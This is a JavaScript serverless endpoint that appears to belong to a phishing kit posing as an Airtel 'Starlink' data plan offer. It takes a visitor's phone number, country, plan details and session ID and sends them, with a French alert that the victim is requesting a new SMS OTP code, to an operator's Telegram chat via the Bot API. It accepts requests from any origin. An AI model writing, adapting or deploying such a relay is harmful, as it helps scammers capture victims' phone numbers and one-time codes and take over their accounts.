const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.VITE_TELEGRAM_CHAT_ID || '';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { sessionId, cloudId, phone, fullPhone, country, planName, planPrice } = req.body || {};

    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId requis' });
    }

    const displayPhone = fullPhone || phone || 'Inconnu';
    const displayCountry = country || 'Airtel Africa';

    const messageText =
      `🔄 <b>DEMANDE DE RENVOI D'UN NOUVEAU CODE OTP SMS</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || 'Forfait Airtel Starlink'} (${
        planPrice || '$1.49'
      })\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${cloudId || sessionId}</code>\n\n` +
      `ℹ️ <i>Le client demande l'envoi d'un nouveau code OTP par SMS.</i>`;

    let tgData = null;
    if (BOT_TOKEN && CHAT_ID) {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: messageText,
          parse_mode: 'HTML',
        }),
      });
      tgData = await tgRes.json();
    }

    const telegramSent = Boolean(tgData && tgData.ok);

    return res.status(200).json({
      success: true,
      telegramSent,
      sessionId,
      cloudId,
      telegram: tgData,
    });
  } catch (error) {
    console.error('resend-otp serverless error:', error);
    return res.status(500).json({ error: error.message });
  }
}
